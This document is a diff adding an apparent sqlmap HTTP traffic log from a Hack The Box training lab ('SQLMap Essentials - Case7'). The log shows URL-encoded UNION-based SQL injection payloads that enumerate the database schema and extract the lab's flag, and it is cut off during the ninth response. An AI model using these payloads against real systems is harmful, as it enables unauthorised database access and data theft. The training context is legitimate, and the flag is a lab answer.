@@ -1,0 +1,1153 @@
+HTTP request [#1]:
+GET /case7.php?id=1 HTTP/1.1
+Host: 83.136.255.217
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://83.136.255.217:59885/case7.php
+Upgrade-Insecure-Requests: 1
+Connection: close
+
+HTTP response [#1] (200 OK):
+Date: Wed, 02 Oct 2024 00:09:41 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 936
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://83.136.255.217:59885/case7.php?id=1
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case7</title>
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top">
+    <div class="container">
+      <a class="navbar-brand" href="#"></a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item active">
+            <a class="nav-link" href="#">Home
+              <span class="sr-only">(current)</span>
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">Wiki</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/">GitHub</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <br>
+
+  <!-- Page Content -->
+  <div class="container">
+    <div class="card bg-light">
+    <div class="card-block m-2">
+    <h1 class="display-4">Case7 - UNION SQLi with adjustments</h1>
+    <hr>
+    <p class="lead ml-2">Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p>
+    </p>
+    </div>
+    </div>
+  </div>
+
+  <br>
+
+  <div class="container" id="result">
+    <table class="table">
+<thead><th>id</th><th>name</th><th>birthday</th><th>occupation</th><th>phone</th></thead>
+<tr><td>1</td><td>Maynard Rice</td><td>March 1 1958</td><td>Linemen</td><td>281-559-0172</td></tr>
+</table>  </div>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.slim.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+</body>
+
+</html>
+
+
+############################################################################
+
+HTTP request [#2]:
+GET /case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CIFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%2C0x7162707a71%29--%20- HTTP/1.1
+Host: 83.136.255.217
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://83.136.255.217:59885/case7.php
+Upgrade-Insecure-Requests: 1
+Connection: close
+
+HTTP response [#2] (200 OK):
+Date: Wed, 02 Oct 2024 00:09:42 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 956
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://83.136.255.217:59885/case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CIFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%2C0x7162707a71%29--%20-
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case7</title>
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top">
+    <div class="container">
+      <a class="navbar-brand" href="#"></a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item active">
+            <a class="nav-link" href="#">Home
+              <span class="sr-only">(current)</span>
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">Wiki</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/">GitHub</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <br>
+
+  <!-- Page Content -->
+  <div class="container">
+    <div class="card bg-light">
+    <div class="card-block m-2">
+    <h1 class="display-4">Case7 - UNION SQLi with adjustments</h1>
+    <hr>
+    <p class="lead ml-2">Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p>
+    </p>
+    </div>
+    </div>
+  </div>
+
+  <br>
+
+  <div class="container" id="result">
+    <table class="table">
+<thead><th>id</th><th>name</th><th>birthday</th><th>occupation</th><th>phone</th></thead>
+<tr><td>1</td><td>Maynard Rice</td><td>March 1 1958</td><td>Linemen</td><td>281-559-0172</td></tr>
+<tr><td></td><td></td><td></td><td></td><td>qpqvqtestdbqbpzq</td></tr>
+</table>  </div>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.slim.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+</body>
+
+</html>
+
+
+############################################################################
+
+HTTP request [#3]:
+GET /case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CJSON_ARRAYAGG%28CONCAT_WS%280x716876776b6a%2Ctable_name%29%29%2C0x7162707a71%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x746573746462%29--%20- HTTP/1.1
+Host: 83.136.255.217
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://83.136.255.217:59885/case7.php
+Upgrade-Insecure-Requests: 1
+Connection: close
+
+HTTP response [#3] (200 OK):
+Date: Wed, 02 Oct 2024 00:09:42 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 846
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://83.136.255.217:59885/case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CJSON_ARRAYAGG%28CONCAT_WS%280x716876776b6a%2Ctable_name%29%29%2C0x7162707a71%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x746573746462%29--%20-
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case7</title>
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top">
+    <div class="container">
+      <a class="navbar-brand" href="#"></a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item active">
+            <a class="nav-link" href="#">Home
+              <span class="sr-only">(current)</span>
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">Wiki</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/">GitHub</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <br>
+
+  <!-- Page Content -->
+  <div class="container">
+    <div class="card bg-light">
+    <div class="card-block m-2">
+    <h1 class="display-4">Case7 - UNION SQLi with adjustments</h1>
+    <hr>
+    <p class="lead ml-2">Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p>
+    </p>
+    </div>
+    </div>
+  </div>
+
+  <br>
+
+  <div class="container" id="result">
+    <table class="table">
+</table>  </div>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.slim.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+</body>
+
+</html>
+
+
+############################################################################
+
+HTTP request [#4]:
+GET /case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CIFNULL%28CAST%28table_name%20AS%20NCHAR%29%2C0x20%29%2C0x7162707a71%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x746573746462%29--%20- HTTP/1.1
+Host: 83.136.255.217
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://83.136.255.217:59885/case7.php
+Upgrade-Insecure-Requests: 1
+Connection: close
+
+HTTP response [#4] (200 OK):
+Date: Wed, 02 Oct 2024 00:09:42 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 965
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://83.136.255.217:59885/case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CIFNULL%28CAST%28table_name%20AS%20NCHAR%29%2C0x20%29%2C0x7162707a71%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x746573746462%29--%20-
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case7</title>
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top">
+    <div class="container">
+      <a class="navbar-brand" href="#"></a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item active">
+            <a class="nav-link" href="#">Home
+              <span class="sr-only">(current)</span>
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">Wiki</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/">GitHub</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <br>
+
+  <!-- Page Content -->
+  <div class="container">
+    <div class="card bg-light">
+    <div class="card-block m-2">
+    <h1 class="display-4">Case7 - UNION SQLi with adjustments</h1>
+    <hr>
+    <p class="lead ml-2">Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p>
+    </p>
+    </div>
+    </div>
+  </div>
+
+  <br>
+
+  <div class="container" id="result">
+    <table class="table">
+<thead><th>id</th><th>name</th><th>birthday</th><th>occupation</th><th>phone</th></thead>
+<tr><td>1</td><td>Maynard Rice</td><td>March 1 1958</td><td>Linemen</td><td>281-559-0172</td></tr>
+<tr><td></td><td></td><td></td><td></td><td>qpqvqflag7qbpzq</td></tr>
+<tr><td></td><td></td><td></td><td></td><td>qpqvqusersqbpzq</td></tr>
+</table>  </div>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.slim.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+</body>
+
+</html>
+
+
+############################################################################
+
+HTTP request [#5]:
+GET /case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CJSON_ARRAYAGG%28CONCAT_WS%280x716876776b6a%2Ccolumn_name%2Ccolumn_type%29%29%2C0x7162707a71%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x666c616737%20AND%20table_schema%3D0x746573746462--%20- HTTP/1.1
+Host: 83.136.255.217
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://83.136.255.217:59885/case7.php
+Upgrade-Insecure-Requests: 1
+Connection: close
+
+HTTP response [#5] (200 OK):
+Date: Wed, 02 Oct 2024 00:09:43 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 846
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://83.136.255.217:59885/case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CJSON_ARRAYAGG%28CONCAT_WS%280x716876776b6a%2Ccolumn_name%2Ccolumn_type%29%29%2C0x7162707a71%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x666c616737%20AND%20table_schema%3D0x746573746462--%20-
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case7</title>
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top">
+    <div class="container">
+      <a class="navbar-brand" href="#"></a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item active">
+            <a class="nav-link" href="#">Home
+              <span class="sr-only">(current)</span>
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">Wiki</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/">GitHub</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <br>
+
+  <!-- Page Content -->
+  <div class="container">
+    <div class="card bg-light">
+    <div class="card-block m-2">
+    <h1 class="display-4">Case7 - UNION SQLi with adjustments</h1>
+    <hr>
+    <p class="lead ml-2">Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p>
+    </p>
+    </div>
+    </div>
+  </div>
+
+  <br>
+
+  <div class="container" id="result">
+    <table class="table">
+</table>  </div>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.slim.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+</body>
+
+</html>
+
+
+############################################################################
+
+HTTP request [#6]:
+GET /case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CIFNULL%28CAST%28column_name%20AS%20NCHAR%29%2C0x20%29%2C0x716876776b6a%2CIFNULL%28CAST%28column_type%20AS%20NCHAR%29%2C0x20%29%2C0x7162707a71%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x666c616737%20AND%20table_schema%3D0x746573746462--%20- HTTP/1.1
+Host: 83.136.255.217
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://83.136.255.217:59885/case7.php
+Upgrade-Insecure-Requests: 1
+Connection: close
+
+HTTP response [#6] (200 OK):
+Date: Wed, 02 Oct 2024 00:09:43 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 983
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://83.136.255.217:59885/case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CIFNULL%28CAST%28column_name%20AS%20NCHAR%29%2C0x20%29%2C0x716876776b6a%2CIFNULL%28CAST%28column_type%20AS%20NCHAR%29%2C0x20%29%2C0x7162707a71%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x666c616737%20AND%20table_schema%3D0x746573746462--%20-
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case7</title>
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top">
+    <div class="container">
+      <a class="navbar-brand" href="#"></a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item active">
+            <a class="nav-link" href="#">Home
+              <span class="sr-only">(current)</span>
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">Wiki</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/">GitHub</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <br>
+
+  <!-- Page Content -->
+  <div class="container">
+    <div class="card bg-light">
+    <div class="card-block m-2">
+    <h1 class="display-4">Case7 - UNION SQLi with adjustments</h1>
+    <hr>
+    <p class="lead ml-2">Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p>
+    </p>
+    </div>
+    </div>
+  </div>
+
+  <br>
+
+  <div class="container" id="result">
+    <table class="table">
+<thead><th>id</th><th>name</th><th>birthday</th><th>occupation</th><th>phone</th></thead>
+<tr><td>1</td><td>Maynard Rice</td><td>March 1 1958</td><td>Linemen</td><td>281-559-0172</td></tr>
+<tr><td></td><td></td><td></td><td></td><td>qpqvqidqhvwkjint(11)qbpzq</td></tr>
+<tr><td></td><td></td><td></td><td></td><td>qpqvqcontentqhvwkjvarchar(512)qbpzq</td></tr>
+</table>  </div>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.slim.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+</body>
+
+</html>
+
+
+############################################################################
+
+HTTP request [#7]:
+GET /case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CJSON_ARRAYAGG%28CONCAT_WS%280x716876776b6a%2Ccontent%2Cid%29%29%2C0x7162707a71%29%20FROM%20testdb.flag7--%20- HTTP/1.1
+Host: 83.136.255.217
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://83.136.255.217:59885/case7.php
+Upgrade-Insecure-Requests: 1
+Connection: close
+
+HTTP response [#7] (200 OK):
+Date: Wed, 02 Oct 2024 00:09:43 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 846
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://83.136.255.217:59885/case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CJSON_ARRAYAGG%28CONCAT_WS%280x716876776b6a%2Ccontent%2Cid%29%29%2C0x7162707a71%29%20FROM%20testdb.flag7--%20-
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case7</title>
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top">
+    <div class="container">
+      <a class="navbar-brand" href="#"></a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item active">
+            <a class="nav-link" href="#">Home
+              <span class="sr-only">(current)</span>
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">Wiki</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/">GitHub</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <br>
+
+  <!-- Page Content -->
+  <div class="container">
+    <div class="card bg-light">
+    <div class="card-block m-2">
+    <h1 class="display-4">Case7 - UNION SQLi with adjustments</h1>
+    <hr>
+    <p class="lead ml-2">Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p>
+    </p>
+    </div>
+    </div>
+  </div>
+
+  <br>
+
+  <div class="container" id="result">
+    <table class="table">
+</table>  </div>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.slim.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+</body>
+
+</html>
+
+
+############################################################################
+
+HTTP request [#8]:
+GET /case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CIFNULL%28CAST%28content%20AS%20NCHAR%29%2C0x20%29%2C0x716876776b6a%2CIFNULL%28CAST%28id%20AS%20NCHAR%29%2C0x20%29%2C0x7162707a71%29%20FROM%20testdb.flag7--%20- HTTP/1.1
+Host: 83.136.255.217
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://83.136.255.217:59885/case7.php
+Upgrade-Insecure-Requests: 1
+Connection: close
+
+HTTP response [#8] (200 OK):
+Date: Wed, 02 Oct 2024 00:09:44 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 979
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://83.136.255.217:59885/case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CIFNULL%28CAST%28content%20AS%20NCHAR%29%2C0x20%29%2C0x716876776b6a%2CIFNULL%28CAST%28id%20AS%20NCHAR%29%2C0x20%29%2C0x7162707a71%29%20FROM%20testdb.flag7--%20-
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case7</title>
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top">
+    <div class="container">
+      <a class="navbar-brand" href="#"></a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item active">
+            <a class="nav-link" href="#">Home
+              <span class="sr-only">(current)</span>
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">Wiki</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://github.com/sqlmapproject/sqlmap/">GitHub</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <br>
+
+  <!-- Page Content -->
+  <div class="container">
+    <div class="card bg-light">
+    <div class="card-block m-2">
+    <h1 class="display-4">Case7 - UNION SQLi with adjustments</h1>
+    <hr>
+    <p class="lead ml-2">Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p>
+    </p>
+    </div>
+    </div>
+  </div>
+
+  <br>
+
+  <div class="container" id="result">
+    <table class="table">
+<thead><th>id</th><th>name</th><th>birthday</th><th>occupation</th><th>phone</th></thead>
+<tr><td>1</td><td>Maynard Rice</td><td>March 1 1958</td><td>Linemen</td><td>281-559-0172</td></tr>
+<tr><td></td><td></td><td></td><td></td><td>qpqvqHTB{un173_7h3_un173d}qhvwkj1qbpzq</td></tr>
+</table>  </div>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.slim.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+</body>
+
+</html>
+
+
+############################################################################
+
+HTTP request [#9]:
+GET /case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CJSON_ARRAYAGG%28CONCAT_WS%280x716876776b6a%2Ccolumn_name%2Ccolumn_type%29%29%2C0x7162707a71%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x746573746462--%20- HTTP/1.1
+Host: 83.136.255.217
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://83.136.255.217:59885/case7.php
+Upgrade-Insecure-Requests: 1
+Connection: close
+
+HTTP response [#9] (200 OK):
+Date: Wed, 02 Oct 2024 00:09:44 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 846
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://83.136.255.217:59885/case7.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7170717671%2CJSON_ARRAYAGG%28CONCAT_WS%280x716876776b6a%2Ccolumn_name%2Ccolumn_type%29%29%2C0x7162707a71%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x746573746462--%20-
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case7</title>
